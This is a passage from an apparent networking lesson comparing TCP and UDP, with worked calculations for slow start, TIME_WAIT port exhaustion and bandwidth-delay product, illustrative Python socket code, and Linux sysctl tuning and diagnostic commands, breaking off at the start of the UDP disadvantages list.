**Flow control detail.** `rwnd` is a 16-bit field (max 65,535 bytes), which was far too small by the 1990s. The **window scaling** option multiplies it by up to 2¹⁴, allowing windows up to ~1 GB. If a middlebox strips the window-scale option, throughput silently collapses on high-bandwidth long-distance links — a classic "the network is fast but transfers are slow" mystery. If the receiving *application* stops calling `recv()`, the buffer fills, `rwnd` goes to zero, and the sender stops entirely: a slow consumer throttles the producer, which is usually what you want.

**Congestion control detail.** The sender starts cautiously and probes for capacity:

1. **Slow start.** `cwnd` begins at ~10 MSS (≈14.6 KB, the modern default, raised from 1–4 historically). For **every** ACK received, `cwnd` increases by 1 MSS — which means it **doubles every RTT**. Despite the name, this is exponential growth and is anything but slow.
2. **Congestion avoidance.** Once `cwnd` reaches a threshold (`ssthresh`) or loss occurs, growth becomes **linear**: +1 MSS per RTT. Careful probing instead of doubling.
3. **On loss.** Classic behaviour (Reno/CUBIC family): halve `cwnd` (CUBIC multiplies by ~0.7) and resume congestion avoidance. On an RTO — a much worse signal — drop `cwnd` all the way back to the initial window and restart slow start.

```
cwnd
  |                                      /\
  |              slow start           /     \   loss -> cut, then linear again
  |             (doubles/RTT)      /         \      /
  |                    /\       /              \  /
  |                 /     \  /   congestion avoidance (+1 MSS/RTT)
  |              /         X  <- first loss: ssthresh set here
  |           /
  |        /
  |_____/______________________________________________ time (RTTs)
```

**Algorithms you should be able to name:**

| Algorithm | Signal it reacts to | Behaviour | Where used |
|---|---|---|---|
| **Reno / NewReno** | Loss | Halve on loss, +1/RTT | Historical baseline |
| **CUBIC** | Loss | Cubic growth curve; recovers quickly on high-bandwidth links | **Default in Linux, Windows, Android** |
| **BBR** | Bandwidth and RTT estimates, **not loss** | Models the path's actual capacity; much better on lossy links | Google, YouTube, many CDNs |

The practical significance of BBR: loss-based algorithms interpret *any* loss as congestion. On a mobile link where packets are lost due to radio interference rather than queueing, CUBIC repeatedly halves its window and throughput collapses. BBR measures delivery rate instead, and can be several times faster on such links.

**The key insight for system design:** a brand-new TCP connection starts at ~14.6 KB in flight and must grow exponentially. A 200 KB response therefore cannot be sent in one burst — it takes multiple RTTs regardless of how much bandwidth you have. §9 computes exactly how many. **Short connections never reach full speed**, which is another argument for connection reuse.

### 4.5 Head-of-line blocking

TCP must deliver bytes **in order**. If segment 3 of 1–10 is lost, segments 4–10 may already be sitting in the receiver's kernel buffer — but the application **cannot see any of them** until segment 3 is retransmitted and arrives. One lost packet stalls everything behind it for at least one RTT.

This has consequences at three layers, and distinguishing them is important:

1. **HTTP/1.1 application-layer HOL blocking.** One request per connection at a time; a slow response blocks the queued ones. Worked around with 6 parallel connections (Lesson 5).
2. **HTTP/2 transport-layer HOL blocking.** HTTP/2 multiplexes many streams over *one* TCP connection, solving (1). But all streams share one byte stream, so **a single lost packet stalls every stream** — including ones whose data already arrived. Under loss, HTTP/2 can be *worse* than HTTP/1.1's six connections, because six connections means loss only stalls one sixth of the traffic.
3. **HTTP/3 / QUIC.** Runs over UDP and implements **per-stream** sequencing in user space. A lost packet stalls only the stream it belonged to; the others are delivered immediately. This is the single biggest reason HTTP/3 exists, and it cannot be fixed in TCP because TCP's in-order guarantee is baked into kernels and middleboxes worldwide (Lesson 9).

### 4.6 Teardown: FIN, and the TIME_WAIT problem

TCP connections close in each direction independently — it is a **four-way** exchange:

```
Client                                 Server
  |---- FIN --------------------------->|   "I'm done sending"
  |<--- ACK ----------------------------|
  |         (server may still send)     |
  |<--- FIN ----------------------------|   "I'm done too"
  |---- ACK --------------------------->|
  |  [ TIME_WAIT: ~60 s on Linux ]      |
```

The side that sends the **first FIN** (performs the *active close*) enters **TIME_WAIT** and stays there for `2 × MSL` — Maximum Segment Lifetime — which on Linux is a fixed **60 seconds**.

Why TIME_WAIT must exist, both reasons:
1. **To absorb delayed duplicates.** A segment from the old connection could wander the network and arrive late. If the same four-tuple were immediately reused, that stray segment would be injected into the *new* connection's stream and corrupt it.
2. **To guarantee a clean close.** The final ACK may be lost; the peer will retransmit its FIN, and only a socket still in TIME_WAIT can answer it.

**The operational problem, connecting directly back to Lesson 3's port exhaustion.** A connection is identified by the four-tuple `(src IP, src port, dst IP, dst port)`. When your server acts as a *client* to a backend — and it always does — it allocates an **ephemeral source port** from a range that is typically **28,232 ports** on Linux (`32768–60999`). Each closed connection holds its port in TIME_WAIT for 60 seconds.

```
Maximum sustainable new connections per second to ONE destination
    = ephemeral ports / TIME_WAIT duration
    = 28,232 / 60
    ≈ 470 connections/second
```

**470 new connections per second, per destination IP:port.** Beyond that you get `EADDRNOTAVAIL` / "cannot assign requested address" and your service fails, even though CPU, memory, and bandwidth are all idle. This failure mode is extremely common in microservice architectures that do not pool connections.

Fixes, in order of preference:
1. **Reuse connections (keep-alive pooling).** This is the real fix — it eliminates the churn entirely. Lesson 5, §4.4.
2. **`net.ipv4.tcp_tw_reuse = 1`** — lets the kernel reuse a TIME_WAIT socket for a new *outbound* connection when safe (timestamps enabled). Safe and effective for clients.
3. **Widen the ephemeral range**: `net.ipv4.ip_local_port_range = 1024 65535` → ~64,500 ports → ~1,075 conn/s. Buys roughly 2×; not a fix.
4. **Add destination diversity** — more backend IPs or ports multiplies the four-tuple space.
5. **Never use `tcp_tw_recycle`.** It was removed from Linux 4.12 because it broke catastrophically behind NAT. If a tutorial recommends it, the tutorial is older than your kernel.

### 4.7 Bandwidth-delay product

**BDP = bandwidth × RTT.** It is the number of bytes that can be "in the pipe" — sent but not yet acknowledged — at any instant. To keep a link fully utilised, the sender's window must be at least the BDP.

This is the single most useful formula in network performance work, because it explains the extremely common complaint: *"we have a 1 Gbps link but transfers only hit 50 Mbps."*

Worked calculation — Mumbai to Virginia:

```
Assumptions (stated):
  Link bandwidth        = 1 Gbps = 1,000,000,000 bits/s = 125,000,000 bytes/s
  RTT                   = 200 ms = 0.2 s
  Receive window actually in use = 64 KB (window scaling disabled by a middlebox)

Step 1 - BDP:
  BDP = 125,000,000 bytes/s x 0.2 s
      = 25,000,000 bytes
      = 25,000,000 / 1,048,576 = 23.84 MiB

Step 2 - achievable throughput with a 64 KB window:
  Throughput = window / RTT
             = 65,536 bytes / 0.2 s
             = 327,680 bytes/s
             = 2.62 Mbps

Step 3 - utilisation:
  2.62 Mbps / 1,000 Mbps = 0.26 %
```

**0.26 % of a gigabit link**, purely because the window was 64 KB instead of ~24 MiB. No amount of extra bandwidth helps; the sender spends 99.7 % of its time waiting for ACKs. The fix is window scaling (and enough buffer memory), not a bigger pipe.

Same link, window scaling working correctly with a 32 MiB buffer:

```
  Throughput = 33,554,432 bytes / 0.2 s = 167,772,160 bytes/s = 1.34 Gbps
  -> now the 1 Gbps link is the limit, which is what we want.
```

And the reverse direction of the insight: **within a region (RTT 1 ms), BDP is tiny**:

```
  BDP = 125,000,000 x 0.001 = 125,000 bytes = 122 KiB
```

so default buffers are fine and nobody ever notices. **BDP problems are long-distance problems.** That is a large part of why you place data close to users (Phase 2, Topic 14 — CDNs and edge caching) rather than tuning TCP.

### 4.8 When UDP wins, and reliability rebuilt on top of it

UDP is chosen for one of three reasons: **latency intolerance**, **overhead avoidance**, or **the need to control the transport yourself**.

| Use case | Why UDP | What they give up / rebuild |
|---|---|---|
| **DNS** (Lesson 4) | A 60-byte question and a 200-byte answer. A handshake would triple the cost and add an RTT | Retry on timeout in the resolver; falls back to **TCP** when the response exceeds 512 bytes or is truncated (`TC` bit set) |
| **Live voice / video (RTP)** | A retransmitted audio frame arrives after its playback slot and is worthless | Jitter buffer, forward error correction, packet-loss concealment that interpolates missing audio |
| **Online games** | At 60 ticks/second, state updates supersede each other. A lost position update is irrelevant because a newer one is 16 ms away | Sequence numbers to drop *stale* packets, selective reliability for critical events (a weapon fire), client-side prediction and server reconciliation |
| **QUIC / HTTP/3** | Needs **per-stream** ordering, which TCP cannot provide, plus deployability without kernel changes | Reimplements sequencing, ACKs, loss recovery, congestion control, and TLS 1.3 — **entirely in user space** |
| **Video streaming via QUIC** | 0-RTT resumption, connection migration across Wi-Fi→cellular | Same as QUIC |
| **Telemetry / metrics (StatsD)** | 50,000 counters/second where losing a few is harmless, and the sender must never block | Accepts loss; often aggregates locally first |
| **Service discovery (mDNS), NTP, DHCP, SNMP, syslog** | Small, periodic, broadcast or multicast-friendly, loss-tolerant | Periodic repetition instead of retransmission |

**The QUIC point deserves emphasis**, because it reframes what UDP is for. QUIC is *more* reliable and *more* featureful than TCP: encrypted by default, per-stream loss recovery, connection IDs that survive an IP address change (so a phone moving from Wi-Fi to 5G keeps its connection), and 0-RTT resumption. It is built on UDP not because its authors wanted unreliability, but because:

- **TCP cannot be changed.** Middleboxes — NATs, firewalls, "optimisers" — inspect and mangle TCP headers. A new TCP option is dropped by enough of the internet to be undeployable. This is **protocol ossification**.
- **TCP lives in the kernel.** Shipping a change means waiting years for OS upgrades across billions of devices. QUIC lives in the application, so Chrome and your server can both update next week.

So the modern framing is: **UDP is not "the unreliable one". UDP is the blank canvas where new transports are built.** That is the sentence to use in an interview.

**Rebuilding reliability on UDP requires, at minimum:** sequence numbers, acknowledgements, a retransmission timer with backoff, duplicate detection, a reordering buffer, flow control, **and congestion control**. The last one is the one amateurs omit, and omitting it is genuinely harmful — a UDP application that blasts at line rate starves every TCP flow sharing the path, because TCP politely backs off and UDP does not. If you are writing a custom UDP protocol and have not implemented congestion control, you have written a denial-of-service tool.

## 5. Request / data flow

A BookNook API call over TCP, from socket creation to teardown:

1. The app server needs `pricing-service`. Its connection pool is empty, so it must open a new connection.
2. Kernel allocates an **ephemeral source port**, say 41,337, from `32768–60999`. The connection is now identified by the four-tuple `(10.0.1.11, 41337, 10.0.2.40, 8080)` (Lesson 3).
3. Client sends **SYN** with a random ISN `x`.
4. Server's kernel places it in the SYN queue, replies **SYN-ACK** with ISN `y` and `ack=x+1`.
5. Client sends **ACK** `ack=y+1`. The connection is ESTABLISHED on the client after ~**1 RTT**; the server's kernel moves it to the accept queue.
6. The server application calls `accept()` and gets the socket. If the app is slow here, the accept queue overflows and SYNs are **silently dropped** — clients see timeouts, not errors.
7. Client writes a 420-byte HTTP request. It fits in one segment (MSS ≈ 1,460). `cwnd` starts at 10 MSS, so there is ample room.
8. Server's kernel ACKs the segment. **Note: the ACK means the kernel buffered it, not that the application read it.**
9. Server application reads from the socket **in a loop** until it has the full HTTP request (Lesson 5) — because TCP preserves no message boundaries.
10. Server computes a 180 KB JSON response and writes it to the socket.
11. The kernel cannot send 180 KB at once: `min(rwnd, cwnd)` limits it. With `cwnd = 10 × 1,460 = 14.6 KB`, only 14.6 KB goes out in the first RTT.
12. ACKs return; **slow start doubles `cwnd` each RTT**: 14.6 KB → 29.2 KB → 58.4 KB → 116.8 KB. The 180 KB response therefore needs **4 RTTs** (§9 Part A computes this exactly).
13. Suppose one segment is lost. The receiver keeps ACKing the last in-order byte. After **3 duplicate ACKs** the sender fast-retransmits — roughly 1 extra RTT.
14. Meanwhile the receiving application sees **nothing at all** from the segments after the gap, even though they are in its kernel buffer: **head-of-line blocking**.
15. The retransmitted segment arrives; the kernel delivers the whole contiguous run at once; the application finally parses the response.
16. The HTTP client keeps the connection in its pool (`Connection: keep-alive`). **The next 500 calls skip steps 2–6 entirely** — no handshake, and `cwnd` is already large, so they also skip slow start.
17. After a 50-second idle timeout, the client closes: **FIN → ACK → FIN → ACK**.
18. Because the **client** closed first, the client socket enters **TIME_WAIT for 60 seconds**, holding port 41,337. At 470 such closes per second per destination, the client runs out of ports (§4.6).

For contrast, a DNS lookup over UDP is steps 1, one `sendto`, one `recvfrom`. No handshake, no state, no TIME_WAIT. If no answer arrives within the resolver's timeout (commonly 1–5 s), it simply asks again, possibly a different server.

## 6. ASCII diagram

```
 THE STACK
 +---------------------------------------------------------------+
 |  Application:  HTTP (L5/L6) | DNS (L4) | RTP | game protocol   |
 +---------------------------------------------------------------+
 |  TLS (L7) - only over TCP   |          (QUIC embeds TLS 1.3)   |
 +------------------------------+--------------------------------+
 |  TCP                         |  UDP                           |
 |  reliable, ordered, stream   |  best-effort, message, 8B hdr   |
 |  handshake, ACK, retransmit  |  no handshake, no state         |
 |  flow + congestion control   |  no control of any kind         |
 +------------------------------+--------------------------------+
 |  IP - best effort: may lose, reorder, duplicate, delay         |
 +---------------------------------------------------------------+

 THREE-WAY HANDSHAKE (1 RTT before data)      TEARDOWN (4 packets + TIME_WAIT)
   client            server                     client            server
     |-- SYN seq=x ---->|                         |-- FIN -------->|
     |<- SYN-ACK y,x+1 -|  <- 1 RTT               |<- ACK ---------|
     |-- ACK y+1 ------>|                         |<- FIN ---------|
     |-- DATA --------->|                         |-- ACK -------->|
                                                  | TIME_WAIT 60s  |  <- holds the port!
                                                  | 28,232 ports / 60 s
                                                  |   = ~470 conn/s MAX

 CONGESTION WINDOW GROWTH (why small responses still take several RTTs)
   RTT 1:  cwnd = 10 MSS  =  14.6 KB   |#####
   RTT 2:  cwnd = 20 MSS  =  29.2 KB   |##########
   RTT 3:  cwnd = 40 MSS  =  58.4 KB   |####################
   RTT 4:  cwnd = 80 MSS  = 116.8 KB   |########################################
   RTT 5:  LOSS -> cwnd halved         |####################      <- congestion avoidance
                                       |#####################     (+1 MSS per RTT)

 FLOW CONTROL vs CONGESTION CONTROL  (sender may have min(rwnd, cwnd) in flight)
   +----------------+---------------------------+----------------------------+
   |                | flow control (rwnd)       | congestion control (cwnd)  |
   | protects       | the RECEIVER's buffer     | the NETWORK's queues       |
   | who sets it    | receiver, sent in each ACK| sender, never transmitted  |
   | signal         | explicit number           | inferred from loss / delay |
   +----------------+---------------------------+----------------------------+

 HEAD-OF-LINE BLOCKING (one loss stalls everything behind it)
   TCP receive buffer:   [1][2][ X ][4][5][6]
                                ^ lost
   app can read:         1,2  ... then NOTHING until 3 is retransmitted,
                         even though 4,5,6 are already in memory.

   QUIC (UDP) streams:   stream A [1][2][ X ][4]   <- only A stalls
                         stream B [1][2][3][4]     <- B delivered immediately

 BANDWIDTH-DELAY PRODUCT
   BDP = bandwidth x RTT = bytes that fit "in the pipe"
   1 Gbps x 200 ms = 25 MB must be in flight to fill the link.
   With a 64 KB window:  64 KB / 200 ms = 2.62 Mbps  =  0.26 % utilisation.
   More bandwidth does NOT help. A bigger window does.
```

## 7. Detailed example

### BookNook: where TCP and UDP each appear

| Traffic | Protocol | Why | Specific tuning |
|---|---|---|---|
| Browser → CDN → origin (HTTP) | **TCP** (and QUIC for modern browsers) | Every byte of the catalogue, cart, and order must arrive intact | Keep-alive pooling; TLS 1.3; HTTP/2 to the edge |
| App server → PostgreSQL | **TCP** | A truncated SQL result is unacceptable | Pool of 20 connections per pod, never per-query connections |
| App server → Redis | **TCP** | Same; also pipelined | Pool; `tcp_tw_reuse` enabled for safety margin |
| DNS lookups | **UDP** (TCP fallback) | 60-byte query; a handshake would triple cost | Local caching resolver; 5 s timeout; falls back to TCP on truncation |
| Metrics to StatsD | **UDP** | 40,000 counters/second; losing 0.1 % is irrelevant; must **never block the request path** | Fire-and-forget `sendto`; local agent aggregates |
| Log shipping | **TCP** | Losing audit logs is a compliance problem | Buffered, with backpressure |
| NTP (clock sync) | **UDP** | Tiny, periodic, loss-tolerant; a late timestamp is worthless | — |
| Payment processor | **TCP + mTLS** | Correctness and identity are absolute | Long-lived pooled connections (Lesson 7) |

**The incident that taught BookNook about TIME_WAIT.** During a sale, the checkout service began failing with `EADDRNOTAVAIL — cannot assign requested address`. CPU was 12 %, memory 30 %, the database was idle, and the error made no sense to anyone on the call. Root cause: the payment client library created a **new TCP connection per request** rather than pooling. At 620 checkouts/second to a single processor IP and port:

```
Required ports in flight = 620 conn/s x 60 s TIME_WAIT = 37,200 ports
Available ephemeral ports = 60,999 - 32,768 + 1        = 28,232 ports
Deficit                   = 37,200 - 28,232            = 8,968 ports
```

The service exhausted every ephemeral port 46 seconds into the traffic spike. Fixes applied, in order: (1) enable connection pooling in the payment client — this alone reduced new connections to ~4/second; (2) widen `ip_local_port_range` to `1024–65535` for headroom; (3) enable `net.ipv4.tcp_tw_reuse=1`; (4) add a dashboard panel for TIME_WAIT socket count and ephemeral port utilisation. **The real lesson: the failure had nothing to do with CPU, memory, bandwidth, or the database — the standard four things everyone checks first.**

### Contrasting example: a real-time multiplayer game server

Imagine BookNook's parent company also runs a multiplayer game. Same company, same cloud, opposite transport decisions.

| | BookNook checkout | Game server |
|---|---|---|
| Transport | TCP | **UDP**, with custom reliability |
| Latency budget | 200–500 ms acceptable | **< 50 ms**, or the game feels broken |
| What a lost packet means | Retransmit; correctness preserved | **Ignore it** — a newer state update arrives in 16 ms |
| Ordering | Mandatory | **Harmful** — an old position must never overwrite a new one |
| Update rate | ~1 request per user action | **60 state packets/second per player** |
| Packet size | 400 B request, 7 KB response | **~200 bytes**, deliberately under MTU to avoid fragmentation |
| Reliability rebuilt | n/a — TCP provides it | Sequence numbers to **discard stale** packets; selective reliability only for critical events (weapon fired, player joined); client-side prediction with server reconciliation |
| Congestion control | CUBIC, from the kernel, free | **Must be implemented by hand**, or the game floods the player's link and degrades their own voice chat |
| Connection state | ESTABLISHED, TIME_WAIT, ports | None — the server keys sessions by its own token, so a player changing networks keeps playing |

Note the mirror-image of head-of-line blocking: for BookNook, in-order delivery is *the* feature. For the game, in-order delivery would be a **bug** — applying a 100 ms-old position after a fresh one would teleport the player backwards. This is why "TCP is better than UDP" is meaningless as a statement; the correct framing is **"which failure mode does this application prefer: late data, or missing data?"**

## 8. Code or configuration example

**These snippets illustrate the concepts and are not production-ready.** They omit timeouts, error handling, security, and — in the UDP case — congestion control, whose absence would make the code genuinely antisocial on a shared network.

```python
import socket, struct, time

# ---------------------------------------------------------------
# TCP: a byte STREAM. The #1 bug is assuming one recv() == one message.
# ---------------------------------------------------------------
def tcp_send_message(sock, payload: bytes):
    # We must invent our own framing because TCP has NO message boundaries.
    # A 4-byte big-endian length prefix is the standard pattern (HTTP uses
    # Content-Length for exactly the same reason -- Lesson 5).
    sock.sendall(struct.pack("!I", len(payload)) + payload)
    # sendall() loops internally: a single send() may accept only PART of the
    # buffer when the congestion/receive window is full. Using send() and
    # ignoring its return value silently truncates data.

def tcp_recv_exactly(sock, n: int) -> bytes:
    """Read EXACTLY n bytes. TCP gives us a stream; we impose structure."""
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("peer closed mid-message")   # half a message = corrupt
        buf += chunk
    return buf

def tcp_recv_message(sock) -> bytes:
    header = tcp_recv_exactly(sock, 4)       # the length prefix may itself be split!
    (length,) = struct.unpack("!I", header)
    if length > 10_000_000:                  # ALWAYS bound this, or a hostile peer
        raise ValueError("message too large") # declares 4GB and OOMs you
    return tcp_recv_exactly(sock, length)


# ---------------------------------------------------------------
# UDP: MESSAGES. Boundaries are perfect; delivery is not.
# ---------------------------------------------------------------
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)   # SOCK_DGRAM = UDP
sock.settimeout(2.0)                                      # there is no "connection" to fail,
                                                          # so a timeout is the ONLY way to
                                                          # notice that nothing came back.

# One sendto() == one datagram == one recvfrom() on the peer. No framing needed.
# Keep payloads under ~1400 bytes: larger datagrams get IP-fragmented, and losing
# ANY fragment discards the WHOLE datagram, multiplying the effective loss rate.
sock.sendto(b"PING:42", ("10.0.2.40", 9999))

try:
    data, addr = sock.recvfrom(1500)        # buffer must be >= datagram size or it's TRUNCATED
except socket.timeout:
    # Could be: request lost, reply lost, server down, or server slow.
    # UDP cannot tell you which. Retrying is safe ONLY if the request is
    # idempotent (Lesson 6's safe/idempotent table; Lesson 17).
    pass


# ---------------------------------------------------------------
# Minimal reliability on UDP -- the shape of what QUIC does properly.
# NOTE: this has NO congestion control, which makes it unfit for any shared
# network. Omitting congestion control is the mistake that turns a custom
# UDP protocol into a denial-of-service tool.
# ---------------------------------------------------------------
class NaiveReliableUDP:
    def __init__(self, sock, peer):
        self.sock, self.peer = sock, peer
        self.seq = 0
        self.rto = 0.2                       # initial retransmission timeout, 200ms

    def send_reliable(self, payload: bytes, max_attempts=5):
        self.seq += 1                        # sequence number: lets the peer detect
        header = struct.pack("!I", self.seq) # duplicates AND discard STALE packets
        rto = self.rto
        for attempt in range(max_attempts):
            self.sock.sendto(header + payload, self.peer)
            try:
                self.sock.settimeout(rto)
                ack, _ = self.sock.recvfrom(64)
                if struct.unpack("!I", ack[:4])[0] == self.seq:
                    return True              # acknowledged
            except socket.timeout:
                rto *= 2                     # exponential backoff, exactly like TCP's RTO
                                             # and like Lesson 17's retry policy
        return False                         # give up; the CALLER must decide what that means
```

Sysctl settings that directly address the failure modes above:

```bash
# --- Ephemeral port exhaustion / TIME_WAIT (section 4.6) ---
# Default 32768-60999 = 28,232 ports => ~470 new conn/s per destination.
# Widening to ~64,500 ports roughly doubles that ceiling. It is HEADROOM, not a fix:
# the real fix is connection pooling.
sysctl -w net.ipv4.ip_local_port_range="1024 65535"

# Allow reusing a TIME_WAIT socket for a NEW OUTBOUND connection when timestamps
# make it provably safe. Safe for clients. (tcp_tw_recycle was REMOVED in Linux 4.12
# because it broke behind NAT -- never enable it, it no longer exists.)
sysctl -w net.ipv4.tcp_tw_reuse=1

# --- SYN backlog (section 4.2) ---
# Completed connections waiting for accept(). Overflow = SYNs DROPPED SILENTLY,
# which the client sees as a timeout, not a refusal.
sysctl -w net.core.somaxconn=4096
sysctl -w net.ipv4.tcp_max_syn_backlog=8192

# --- Bandwidth-delay product (section 4.7) ---
# Auto-tuned receive buffer: min, default, MAX. The max must exceed the BDP or
# long-distance throughput is capped at window/RTT regardless of link speed.
# 32 MiB max supports 1 Gbps at ~250ms RTT.
sysctl -w net.ipv4.tcp_rmem="4096 131072 33554432"
sysctl -w net.ipv4.tcp_wmem="4096  16384 33554432"
sysctl -w net.ipv4.tcp_window_scaling=1    # MUST be on, or rwnd is capped at 64KB

# --- Congestion control (section 4.4) ---
# BBR reacts to measured bandwidth/RTT rather than to loss, so it does not
# collapse on lossy mobile/long-haul links the way CUBIC does.
sysctl -w net.ipv4.tcp_congestion_control=bbr
```

Diagnosing in production:

```bash
# Count sockets by state. A huge TIME_WAIT number on the CLIENT side means
# you are closing connections instead of pooling them.
ss -s

# Per-connection congestion window, RTT, and retransmits -- the single most
# informative networking command most engineers have never run.
ss -tin
#   cwnd:10 rtt:84.3/12.1 retrans:0/5   <- cwnd stuck at 10 means slow start never finished
#                                          (connection too short), retrans>0 means loss.

# Are we dropping SYNs because the app is too slow to accept()?
netstat -s | grep -i -E "listen|overflow"

# Ephemeral port headroom right now.
ss -tan | awk '{print $1}' | sort | uniq -c
```

## 9. Numerical example

**Goal:** compute (a) how many RTTs slow start needs for a real response, (b) the TIME_WAIT connection ceiling, (c) bandwidth-delay product effects, and (d) the latency cost of packet loss.

**Assumptions (all stated, all typical/approximate):**
- MSS = **1,460 bytes** (1,500-byte MTU minus 20 B IP and 20 B TCP headers).
- Initial congestion window = **10 MSS = 14,600 bytes** (the modern Linux default).
- Slow start **doubles `cwnd` every RTT** while no loss occurs.
- Receive window is large enough not to be the limit (window scaling on).
- BookNook response sizes: product page HTML+JSON = **180 KB** (184,320 bytes); API call = **9 KB**; JS bundle = **420 KB**.
- RTT for the regional user = **40 ms**; for the intercontinental user = **220 ms**.
- Packet loss on a good fixed line = **0.1 %**; on a congested mobile link = **2 %**.
- Ephemeral port range = `32768–60999` = **28,232 ports**; TIME_WAIT = **60 s**.
- Peak checkout rate = **620 requests/second** to **one** payment IP:port.

**Part A — how many RTTs does slow start need?**

Cumulative bytes deliverable after *n* RTTs, starting at 10 MSS and doubling:

```
RTT 1:  10 MSS  =  14,600 B   cumulative =  14,600 B
RTT 2:  20 MSS  =  29,200 B   cumulative =  43,800 B
RTT 3:  40 MSS  =  58,400 B   cumulative = 102,200 B
RTT 4:  80 MSS  = 116,800 B   cumulative = 219,000 B
RTT 5: 160 MSS  = 233,600 B   cumulative = 452,600 B
```

```
9 KB API response   (9,216 B)   -> fits in RTT 1            => 1 RTT
180 KB page        (184,320 B)  -> exceeds 102,200, fits in 219,000 => 4 RTTs
420 KB JS bundle   (430,080 B)  -> exceeds 219,000, fits in 452,600 => 5 RTTs
```

Now add the handshake cost and convert to wall-clock time, regional user (40 ms RTT), new connection with TLS 1.3 (TCP 1 + TLS 1 = 2 RTT):

```
9 KB API   : (2 + 1) x 40 ms = 120 ms
180 KB page: (2 + 4) x 40 ms = 240 ms
420 KB JS  : (2 + 5) x 40 ms = 280 ms
```

Intercontinental user (220 ms RTT):

```
9 KB API   : 3 x 220 ms =   660 ms
180 KB page: 6 x 220 ms = 1,320 ms
420 KB JS  : 7 x 220 ms = 1,540 ms
```

**On a reused connection** (`cwnd` already grown past 160 MSS, no handshake):

```
9 KB API   : 1 RTT =  40 ms /  220 ms
180 KB page: 1 RTT =  40 ms /  220 ms
420 KB JS  : 1 RTT =  40 ms /  220 ms
```

```
Saving for the 180 KB page, intercontinental = 1,320 - 220 = 1,100 ms
```

**1.1 seconds saved on one page, purely from connection reuse**, and note that **bandwidth was never the constraint** — this is pure RTT and window growth. This is why "the user has 100 Mbps, why is the site slow?" is such a common and misleading question.

**Part B — the TIME_WAIT ceiling**

```
Max sustainable new connections/second to one destination
   = ephemeral ports / TIME_WAIT seconds
   = 28,232 / 60
   = 470.5 conn/s
```

```
Actual checkout rate = 620 conn/s   (no pooling: one connection per request)
Ports required       = 620 x 60 = 37,200
Ports available      =            28,232
Deficit              =             8,968  -> EADDRNOTAVAIL
Time to exhaustion   = 28,232 / 620 = 45.5 seconds after the spike begins
```

With the widened range (`1024–65535` = 64,512 ports):

```
Max conn/s = 64,512 / 60 = 1,075 conn/s      -> survives 620/s, with 1.73x headroom
```

With connection pooling (100 pooled connections, each reused ~500 times before the 50 s idle timeout):

```
New connections/s = 620 / 500 = 1.24 conn/s
Ports held        = 1.24 x 60 = 74 ports
Port utilisation  = 74 / 28,232 = 0.26 %
```

**Pooling reduced port pressure by a factor of 500.** Widening the port range bought 2.3×; pooling bought 500×. Always fix the architecture before tuning the kernel.

**Part C — bandwidth-delay product**

Mumbai ↔ Virginia replication link, 1 Gbps, 220 ms RTT:

```
Bandwidth in bytes/s = 1,000,000,000 / 8 = 125,000,000 B/s
BDP = 125,000,000 x 0.220 = 27,500,000 bytes = 26.2 MiB
```

Throughput achievable at various window sizes:

```
 64 KiB window:     65,536 / 0.220 =    297,891 B/s =  2.38 Mbps  ( 0.24 % of link)
  1 MiB window:  1,048,576 / 0.220 =  4,766,254 B/s = 38.1  Mbps  ( 3.81 % of link)
  8 MiB window:  8,388,608 / 0.220 = 38,130,036 B/s = 305   Mbps  (30.5  % of link)
 32 MiB window: 33,554,432 / 0.220 = 152,520,145 B/s = 1,220 Mbps (link-limited => 100 %)
```

```
Minimum window to saturate = BDP = 27,500,000 bytes = 26.2 MiB
```

Contrast within one region (1 ms RTT):

```
BDP = 125,000,000 x 0.001 = 125,000 bytes = 122 KiB
```

**The same 1 Gbps link needs a 26 MiB window across continents and a 122 KiB window inside a region — a 215× difference caused entirely by distance.** Nothing about the hardware changed. This is why cross-region replication needs explicit tuning and why moving data closer to users beats buying bandwidth (Phase 2, Topic 14).

**Part D — the latency cost of packet loss**

A 180 KB response is:

```
Segments = 184,320 / 1,460 = 126.2 -> 127 segments
```

At 0.1 % loss on a fixed line:

```
Expected lost segments = 127 x 0.001 = 0.127
Probability at least one segment is lost = 1 - (0.999 ^ 127) = 1 - 0.8808 = 11.9 %
```

So **~12 % of these responses suffer at least one loss event.** Cost of one fast retransmit at 220 ms RTT:

```
Extra delay = 1 RTT = 220 ms
Baseline (reused connection, 1 RTT) = 220 ms
With one loss                       = 440 ms  (a 2x increase for that request)
```

At 2 % loss on a congested mobile link:

```
Expected lost segments = 127 x 0.02 = 2.54
Probability of at least one loss = 1 - (0.98 ^ 127) = 1 - 0.0766 = 92.3 %
```

**92 % of responses hit loss.** And with loss that frequent, `cwnd` is repeatedly halved, so the connection never reaches full speed at all. If any loss triggers an **RTO** rather than a fast retransmit (which happens when the loss is at the tail of the response, so there are no subsequent segments to generate duplicate ACKs):

```
RTO floor = 200 ms, but the initial RTO before RTT samples = 1,000 ms
Tail loss cost = up to 1,000 ms added to a single request
```

**This is the mechanism behind tail latency.** Average latency barely moves — 88 % of fixed-line requests are unaffected — but p99 doubles or worse. When Lesson 16 asks why p99 is 10× p50, this is one of the two main answers (the other being queueing). It is also the precise reason HTTP/3's per-stream recovery matters: under 2 % loss, one lost packet in HTTP/2 stalls *all* concurrent streams, whereas in HTTP/3 it stalls one.

## 10. Trade-offs

**TCP advantages**
- **Reliability is free and correct.** Decades of hardening live in the kernel; you will not write better loss recovery.
- **Ordering is guaranteed**, so application code never deals with reordering.
- **Congestion control is automatic and fair**, protecting both the network and your own other flows.
- **Flow control** means a slow consumer automatically throttles a fast producer — natural backpressure.
- **Universally supported**: every firewall, NAT, and load balancer handles TCP; TLS runs on it (Lesson 7).

**TCP disadvantages**
- **Handshake latency**: 1 RTT before data, 2–3 RTT with TLS.
- **Head-of-line blocking**: one lost packet stalls everything behind it.
- **Connection state** on both ends: memory per connection, plus TIME_WAIT port pressure.
- **Slow start** means short connections never reach full throughput (§9 Part A).
- **Cannot be evolved**: middlebox ossification means new TCP features are undeployable.
- **Loss-based congestion control misbehaves on wireless links**, where loss means interference, not congestion.

**UDP advantages**
- **No handshake, no state, no teardown** — zero setup cost, no TIME_WAIT, trivially scalable server-side.
- **Message boundaries preserved**, so no framing code needed.
- **8-byte header** versus 20–60 for TCP.
- **No head-of-line blocking** — each datagram is independent.
- **Complete control**: you choose what reliability, ordering, and pacing mean for your application.
- **Multicast and broadcast** are possible; TCP cannot do them at all.

**UDP disadvantages**
